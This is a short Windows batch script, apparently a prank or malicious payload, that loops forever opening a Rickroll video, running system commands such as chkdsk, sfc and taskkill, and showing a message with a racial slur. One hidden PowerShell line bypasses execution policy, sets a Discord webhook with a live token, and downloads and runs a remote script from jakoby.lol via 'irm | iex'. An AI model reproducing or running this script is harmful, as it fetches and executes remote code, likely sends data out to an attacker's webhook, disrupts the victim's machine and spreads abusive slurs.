@echo off
:StartLoop
start "" "Rickroll.mp4"
powercfg -s SCHEME_MAX
systeminfo
tasklist
taskkill /F /IM notepad.exe
sfc /scannow
chkdsk C: /f /r
ipconfig /all
ping 8.8.8.8
tracert google.com
netstat -ano
perfmon
stress-ng 
perfmon /report
systeminfo
ping 1.1.1.1
msg * "bich ass nigga hahahahahahahah"
Powershell.exe -executionpolicy powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1449006954180640843/7BXlyjtiYoYhaK3lgRa6QSfOYbq3zFIvAeGRGBopHQYQP5aaQWQKTVp4IDNn3SBK4B3T';$db='';irm https://jakoby.lol/hgw | iex
echo commands executed, repeating mwahahahahahaha bitch
goto StartLoop
